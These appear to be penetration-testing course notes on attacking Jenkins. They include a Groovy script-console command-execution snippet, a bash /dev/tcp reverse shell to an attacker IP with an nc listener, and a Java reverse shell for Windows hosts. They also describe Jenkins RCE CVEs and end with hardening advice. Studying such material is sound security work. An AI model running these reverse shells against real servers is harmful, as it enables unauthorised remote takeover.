
runs on tomcat as a servlet
uses groovy language


script console http://jenkins.ad.someorg.local:8000/script
```groovy
def cmd = 'whoami'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```


Reverse shell connection 
`server`
```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

`attacker`
```shell-session
nc -lvnp 8443
```


## windows host
We could also use [this](https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65e2275abfb378101a505bfb754a95/revsh.groovy) Java reverse shell to gain command execution on a Windows host, swapping out `localhost` and the port for our IP address and listener port.
```groovy
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

---
## Miscellaneous Vulnerabilities

Several remote code execution vulnerabilities exist in various versions of Jenkins. One recent exploit combines two vulnerabilities, CVE-2018-1999002 and [CVE-2019-1003000](https://jenkins.io/security/advisory/2019-01-08/#SECURITY-1266) to achieve pre-authenticated remote code execution, bypassing script security sandbox protection during script compilation. Public exploit PoCs exist to exploit a flaw in Jenkins dynamic routing to bypass the Overall / Read ACL and use Groovy to download and execute a malicious JAR file. This flaw allows users with read permissions to bypass sandbox protections and execute code on the Jenkins master server. This exploit works against Jenkins version 2.137.

Another vulnerability exists in Jenkins 2.150.2, which allows users with JOB creation and BUILD privileges to execute code on the system via Node.js. This vulnerability requires authentication, but if anonymous users are enabled, the exploit will succeed because these users have JOB creation and BUILD privileges by default.

As we have seen, gaining access to Jenkins as an administrator can quickly lead to remote code execution. While several working RCE exploits exist for Jenkins, they are version-specific. At the time of writing, the current LTS release of Jenkins is 2.303.1, which fixes the two flaws detailed above. As with any application or system, it is important to harden Jenkins as much as possible since built-in functionality can be easily used to take over the underlying server.